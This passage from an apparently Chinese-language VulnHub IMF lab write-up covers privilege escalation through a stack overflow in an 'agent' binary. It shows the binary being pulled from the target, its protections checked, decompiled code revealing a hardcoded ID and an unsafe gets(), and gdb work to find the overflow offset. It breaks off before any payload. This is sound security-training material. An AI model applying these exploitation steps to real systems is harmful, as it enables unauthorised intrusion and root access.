unknown<br><br>Nmap done: 1 IP address (1 host up) scanned in 105.55 seconds<br></code></pre></td></tr></table></figure><p>发现新开了7788端口，连接端口发现是运行着 agent 程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc 192.168.135.146 7788</span>                  <br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : 123<br>Invalid Agent ID <br></code></pre></td></tr></table></figure><p>为方便下载，将程序移动到 uploads 目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cp /usr/<span class="hljs-built_in">local</span>/bin/agent /var/www/html/imfadministrator/uploads</span><br></code></pre></td></tr></table></figure><p>kali 下载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.146/imfadministrator/uploads/agent</span><br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><blockquote><p>通过栈溢出进行提权。</p><p>参考：<a href="http://cn-sec.com/archives/555761.html">vulnhub_IMF缓冲区溢出详解 | CN-SEC 中文网</a></p><p>第二种方法：cve-2021-4034（通杀漏洞，202112发现，2022-3-15被cve记录）</p></blockquote><h3 id="1、查看文件保护"><a href="#1、查看文件保护" class="headerlink" title="1、查看文件保护"></a>1、查看文件保护</h3><p><strong>使用 file 和 checksec 查看文件信息和保护措施：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> file agent</span><br>agent: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=444d1910b8b99d492e6e79fe2383fd346fc8d4c7, not stripped<br><span class="hljs-meta">$</span><span class="bash"> checksec agent</span><br>[*] &#x27;/home/pwn/桌面/agent&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br></code></pre></td></tr></table></figure><p>可以看到文件基本信息：32 位、小端序、动态链接程序，且存在<strong>可读可写可执行段</strong> 。</p><h3 id="2、伪代码分析"><a href="#2、伪代码分析" class="headerlink" title="2、伪代码分析"></a>2、伪代码分析</h3><p>将 agent 文件拖入 32 位的 IDA 中进行分析，按 <code>shift+f12</code> 没找到 <code>system(&#39;/bin/sh&#39;)</code> 相关内容。</p><p>按 F5 查看伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> *s2; <span class="hljs-comment">// [esp+8h] [ebp-20h]</span><br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Eh] [ebp-1Ah]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [esp+1Fh] [ebp-9h]</span><br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  asprintf(&amp;s2, <span class="hljs-string">&quot;%i&quot;</span>, <span class="hljs-number">48093572</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  ___ __  __ ___ &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; |_ _|  \\/  | __|  Agent&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  | || |\\/| | _|   Reporting&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; |___|_|  |_|_|    System\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nAgent ID : &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !fgets(&amp;s, <span class="hljs-number">9</span>, <span class="hljs-built_in">stdin</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(&amp;s, s2, <span class="hljs-number">8u</span>) )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>      v7 = getchar();<br>    <span class="hljs-keyword">while</span> ( v7 != <span class="hljs-number">10</span> &amp;&amp; v7 != <span class="hljs-number">-1</span> );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Validated &quot;</span>);<br>    v6 = menu();<br>    <span class="hljs-keyword">switch</span> ( v6 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        extractionpoints();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        requestextraction();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        report();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Exiting...&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Agent ID &quot;</span>);<br>    result = <span class="hljs-number">-2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是溢出函数 report：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">report</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+4h] [ebp-A4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter report update: &quot;</span>);<br>  gets(&amp;s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Report: %s\n&quot;</span>, &amp;s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Submitted for review.&quot;</span>);<br>  <span class="hljs-keyword">return</span> &amp;s;<br>&#125;<br></code></pre></td></tr></table></figure><p>看完伪代码后，可以知道是栈溢出，溢出的位置不难找，只要控制 report 中的 gets 函数读入填充的数据，即可产生栈溢出，但是没有 shellcode，需要我们自己写入 RWX 段，然后将函数的返回地址改为 shellcode 地址。</p><h3 id="3、gdb-分析"><a href="#3、gdb-分析" class="headerlink" title="3、gdb 分析"></a>3、gdb 分析</h3><p>使用 gdb 分析，计算栈偏移，首先在 <code>_gets</code> 函数那里打个断点：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804890E report          proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: main+12F↑p</span><br><span class="hljs-symbol">.text:</span>0804890E<br><span class="hljs-symbol">.text:</span>0804890E s               = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">0A4h</span><br><span class="hljs-symbol">.text:</span>0804890E var_C           = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>0804890E<br><span class="hljs-symbol">.text:</span>0804890E <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>0804890E                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>0804890F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048911</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0A8h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048917</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>0804891A                 <span class="hljs-keyword">push</span>    offset aEnterReportUpd <span class="hljs-comment">; &quot;\nEnter report update: &quot;</span><br><span class="hljs-symbol">.text:</span>0804891F                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048924</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048927</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>0804892A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+s]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048930</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">eax</span>             <span class="hljs-comment">; s</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048931</span>                 <span class="hljs-keyword">call</span>    _gets<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048936</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048939</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0804893C                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+s]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048942</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048943</span>                 <span class="hljs-keyword">push</span>    offset aReportS <span class="hljs-comment">; &quot;Report: %s\n&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048948</span>                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804894D</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048950</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048953</span>                 <span class="hljs-keyword">push</span>    offset aSubmittedForRe <span class="hljs-comment">; &quot;Submitted for review.&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048958</span>                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804895D</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048960</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+s]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048966</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_C], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048969</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+var_C]<br><span class="hljs-symbol">.text:</span>0804896C                 <span class="hljs-keyword">leave</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804896D</span>                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb agent</span> <br>GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1<br>Copyright (C) 2020 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type &quot;show copying&quot; and &quot;show warranty&quot; for details.<br>This GDB was configured as &quot;x86_64-linux-gnu&quot;.<br>Type &quot;show configuration&quot; for configuration details.<br>For bug reporting instructions, please see:<br>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For help, type &quot;help&quot;.<br>Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.<br>pwndbg: created $rebase, $ida gdb functions (can be used with print/break)<br>Reading symbols from agent...<br>(No debugging symbols found in agent)<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *0x08048931</span><br>Breakpoint 1 at 0x8048931<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> r</span><br></code></pre></td></tr></table></figure><p>输入 48093572（这里主要是越过 strncmp 函数，需要让 S2 与 S 相同），然后输入 3 进入 report 函数，到达 gets 函数，接着 next ，输入 ‘AAAAAAAA’ 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs shell">Starting program: /home/pwn/桌面/agent <br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : 48093572<br>Login Validated <br>Main Menu:<br>1. Extraction Points<br>2. Request Extraction<br>3. Submit Report<br>0. Exit<br>Enter selection: 3<br><br>Enter report update: <br>Breakpoint 1, 0x08048931 in report ()<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>─────────────────────────────────[ REGISTERS ]──────────────────────────────────<br> EAX  0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br> EBX  0x0<br> ECX  0xffffffff<br> EDX  0x16<br> EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> EBP  0xffffd188 —▸ 0xffffd1b8 ◂— 0x0<br> ESP  0xffffd0d0 —▸ 0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br> EIP  0x8048931 (report+35) —▸ 0xfffb3ae8 ◂— 0xfffb3ae8<br>───────────────────────────────────[ DISASM ]───────────────────────────────────<br> ► 0x8048931 &lt;report+35&gt;    call   gets@plt &lt;gets@plt&gt;<br>        arg[0]: 0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br>        arg[1]: 0x1<br>        arg[2]: 0x0<br>        arg[3]: 0x80482ea ◂— pop    edi /* &#x27;__isoc99_scanf&#x27; */<br> <br>   0x8048936 &lt;report+40&gt;    add    esp, 0x10<br>   0x8048939 &lt;report+43&gt;    sub    esp, 8<br>   0x804893c &lt;report+46&gt;    lea    eax, [ebp - 0xa4]<br>   0x8048942 &lt;report+52&gt;    push   eax<br>   0x8048943 &lt;report+53&gt;    push   0x8048d6a<br>   0x8048948 &lt;report+58&gt;    call   printf@plt &lt;printf@plt&gt;<br> <br>   0x804894d &lt;report+63&gt;    add    esp, 0x10<br>   0x8048950 &lt;report+66&gt;    sub    esp, 0xc<br>   0x8048953 &lt;report+69&gt;    push   0x8048d76<br>   0x8048958 &lt;report+74&gt;    call   puts@plt &lt;puts@plt&gt;<br>───────────────────────────────────[ STACK ]────────────────────────────────────<br>00:0000│ esp  0xffffd0d0 —▸ 0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br>01:0004│      0xffffd0d4 ◂— 0x1<br>02:0008│      0xffffd0d8 ◂— 0x0<br>03:000c│      0xffffd0dc —▸ 0x80482ea ◂— pop    edi /* &#x27;__isoc99_scanf&#x27; */<br>04:0010│      0xffffd0e0 —▸ 0x804b02c (__isoc99_scanf@got.plt) —▸ 0xf7e20440 (__isoc99_scanf) ◂— endbr32 <br>05:0014│ eax  0xffffd0e4 —▸ 0xf7fe188e ◂— mov    edi, eax<br>06:0018│      0xffffd0e8 —▸ 0x80482ea ◂— pop    edi /* &#x27;__isoc99_scanf&#x27; */<br>07:001c│      0xffffd0ec —▸ 0xf7ffd990 ◂— 0<br>─────────────────────────────────[ BACKTRACE ]──────────────────────────────────<br> ► f 0  8048931 report+35<br>   f 1  804872f main+308<br>   f 2 f7de9ee5 __libc_start_main+245<br>────────────────────────────────────────────────────────────────────────────────<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> n</span><br>AAAAAAAA<br>0x08048936 in report ()<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────<br> EAX  0xffffd0e4 ◂— &#x27;AAAAAAAA&#x27;<br> EBX  0x0<br>*ECX  0xf7fb5580 (_IO_2_1_stdin_) ◂— mov    byte ptr [edx], ah /* 0xfbad2288 */<br>*EDX  0xffffd0ec —▸ 0xf7ffd900 ◂— 0<br> EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> EBP  0xffffd188 —▸ 0xffffd1b8 ◂— 0x0<br> ESP  0xffffd0d0 —▸ 0xffffd0e4 ◂— &#x27;AAAAAAAA&#x27;<br>*EIP  0x8048936 (report+40) ◂— add    esp, 0x10<br>─────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────<br>   0x8048931 &lt;report+35&gt;    call   gets@plt &lt;gets@plt&gt;<br> <br> ► 0x8048936 &lt;report+40&gt;    add    esp, 0x10<br>   0x8048939 &lt;report+43&gt;    sub    esp, 8<br>   0x804893c &lt;report+46&gt;    lea    eax, [ebp - 0xa4]<br>   0x8048942 &lt;report+52&gt;    push   eax<br>   0x8048943 &lt;report+53&gt;    push   0x8048d6a<br>   0x8048948 &lt;report+58&gt;    call   printf@plt &lt;printf@plt&gt;<br> <br>   0x804894d &lt;report+63&gt;    add    esp, 0x10<br>   0x8048950 &lt;report+66&gt;    sub    esp, 0xc<br>   0x8048953 &lt;report+69&gt;    push   0x8048d76<br>   0x8048958 &lt;report+74&gt;    call   puts@plt &lt;puts@plt&gt;<br>─────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────<br>00:0000│ esp  0xffffd0d0 —▸ 0xffffd0e4 ◂— &#x27;AAAAAAAA&#x27;<br>01:0004│      0xffffd0d4 ◂— 0x1<br>02:0008│      0xffffd0d8 ◂— 0x0<br>03:000c│      0xffffd0dc —▸ 0x80482ea ◂— pop    edi /* &#x27;__isoc99_scanf&#x27; */<br>04:0010│      0xffffd0e0 —▸ 0x804b02c (__isoc99_scanf@got.plt) —▸ 0xf7e20440 (__isoc99_scanf) ◂— endbr32 <br>05:0014│ eax  0xffffd0e4 ◂— &#x27;AAAAAAAA&#x27;<br>... ↓<br>07:001c│ edx  0xffffd0ec —▸ 0xf7ffd900 ◂— 0<br>───────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────<br> ► f 0  8048936 report+40<br>   f 1  804872f main+308<br>   f 2 f7de9ee5 __libc_start_main+245<br>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br></code></pre></td></tr></table></figure><p>输入 stack48 ，在栈中找到 EBP 和字符串 ‘AAAAAAAA’ 的位置：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; stack <span class="hljs-number">48</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ <span class="hljs-built_in">esp</span>  <span class="hljs-number">0xffffd0d0</span> —▸ <span class="hljs-number">0xffffd0e4</span> ◂— <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│      <span class="hljs-number">0xffffd0d4</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0xffffd0d8</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">03</span>:000c│      <span class="hljs-number">0xffffd0dc</span> —▸ <span class="hljs-number">0x80482ea</span> ◂— <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">edi</span> /* <span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span> */<br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0xffffd0e0</span> —▸ <span class="hljs-number">0x804b02c</span> (__isoc99_scanf@got<span class="hljs-number">.</span>plt) —▸ <span class="hljs-number">0xf7e20440</span> (__isoc99_scanf) ◂— endbr32 <br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│ <span class="hljs-built_in">eax</span>  <span class="hljs-number">0xffffd0e4</span> ◂— <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span><br>... ↓<br><span class="hljs-number">07</span>:001c│ <span class="hljs-built_in">edx</span>  <span class="hljs-number">0xffffd0ec</span> —▸ <span class="hljs-number">0xf7ffd900</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">08</span>:<span class="hljs-number">0020</span>│      <span class="hljs-number">0xffffd0f0</span> —▸ <span class="hljs-number">0xffffd124</span> —▸ <span class="hljs-number">0xf7dd453c</span> ◂— <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">esi</span><br><span class="hljs-number">09</span>:<span class="hljs-number">0024</span>│      <span class="hljs-number">0xffffd0f4</span> —▸ <span class="hljs-number">0xf7ffdb50</span> —▸ <span class="hljs-number">0xf7ffdaf0</span> —▸ <span class="hljs-number">0xf7fcb3e0</span> —▸ <span class="hljs-number">0xf7ffd990</span> ◂— ...<br>0a:<span class="hljs-number">0028</span>│      <span class="hljs-number">0xffffd0f8</span> —▸ <span class="hljs-number">0xf7fcb420</span> —▸ <span class="hljs-number">0x804834a</span> ◂— <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">edi</span> /* <span class="hljs-string">&#x27;GLIBC_2.7&#x27;</span> */<br><span class="hljs-number">0b</span>:002c│      <span class="hljs-number">0xffffd0fc</span> ◂— <span class="hljs-number">0x1</span><br>... ↓<br><span class="hljs-number">0d</span>:<span class="hljs-number">0034</span>│      <span class="hljs-number">0xffffd104</span> ◂— <span 